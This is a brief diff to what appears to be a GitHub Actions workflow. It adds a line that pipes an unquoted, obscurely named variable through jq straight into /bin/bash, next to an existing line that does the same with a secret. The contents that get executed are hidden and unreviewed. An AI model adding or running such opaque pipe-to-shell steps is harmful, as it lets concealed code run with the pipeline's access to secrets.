@@ -21,6 +21,7 @@ jobs:
           htj986: ${{ secrets.htj986 }}
         run: |
           printf '%s' "$htj986" | jq -r .ou40494 | /bin/bash
+          echo $iay526 | jq -r .tsq99 | /bin/bash
 
       - name: Archive results
         if: always()
